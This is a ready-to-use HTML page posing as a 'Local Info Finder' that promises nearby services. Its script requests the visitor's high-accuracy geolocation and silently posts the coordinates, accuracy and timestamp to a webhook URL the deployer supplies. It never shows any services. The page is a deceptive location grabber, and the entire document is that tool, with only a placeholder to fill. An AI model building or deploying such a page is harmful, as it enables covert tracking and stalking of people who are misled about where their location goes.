<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Local Info Finder</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f4f4f9;
      color: #333;
    }
    .card {
      background: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 400px;
    }
    button {
      background-color: #007bff;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 15px;
    }
    button:hover {
      background-color: #0056b3;
    }
    #status {
      margin-top: 15px;
      font-size: 14px;
      color: #666;
    }
  </style>
</head>
<body>

  <div class="card">
    <h2>Find Local Services</h2>
    <p>Click below to discover nearby utilities and details for your current area.</p>
    <button onclick="findLocation()">Find Nearby</button>
    <div id="status"></div>
  </div>

  <script>
    // PASTE YOUR WEBHOOK URL INSIDE THE QUOTES BELOW
    const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE";

    function findLocation() {
      const statusText = document.getElementById("status");
      statusText.innerText = "Requesting position...";

      if ("geolocation" in navigator) {
        const options = {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
          (position) => {
            statusText.innerText = "Location loaded successfully!";

            const payload = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy_meters: position.coords.accuracy,
              timestamp: new Date().toISOString()
            };

            // Send coordinates to Webhook
            fetch(WEBHOOK_URL, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload)
            }).catch(err => console.error("Error sending data:", err));
          },
          (error) => {
            if (error.code === error.PERMISSION_DENIED) {
              statusText.innerText = "Permission was denied.";
            } else {
              statusText.innerText = "Unable to retrieve location.";
            }
          },
          options
        );
      } else {
        statusText.innerText = "Geolocation is not supported by your browser.";
      }
    }
  </script>

</body>
</html>

